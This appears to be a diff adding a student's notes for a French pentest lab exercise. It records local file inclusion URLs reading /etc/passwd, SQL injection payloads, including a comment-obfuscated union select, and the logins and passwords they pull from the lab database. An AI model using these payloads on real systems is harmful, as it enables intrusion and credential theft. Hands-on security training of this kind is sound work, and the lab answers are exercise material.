@@ -1,0 +1,34 @@
+TP pentest
+--------------------------------------------------------------------------------
+TP2
+
+Q17.
+http://www.entreprise.net/test_lrfi.php?foo=/etc/passwd
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+
+Q18.
+http://www.entreprise.net/test_lrfi.php?foo=/var/www/html/info.php
+
+Q19.
+Server API 	Apache 2.0 Handler
+PHP API 	20151012
+
+Q20.
+login=admin' or 'a'='a' limit 1 offset 4#;&mdp=&validation=
+
+Récupère les 4 logins dans la base : pierrot, phil, simon, olivier
+
+login=' and 'a'='b' union select 1,mdp,3,4 from coeur where login='pierrot'#;
+
+Récupère les 4 passwords dans la base : kffTFDFSdfzer, dddjjjfffkkkrrr, tDDMMPP_, kdjfhGGGdf3423
+
+challenge1 :
+1st = kgjDVFGjkertj
+2nd = FJDKVVVddjfjerERSd
+
+challenge2 :
+'/**/and/**/1=0/**/union/**/select/**/1,mdp,3,4/**/from/**/coeur/**/where/**/login='guillaume
+ksjdifkejr3
+
+login = guillaume
+password = ksjdifkejr3
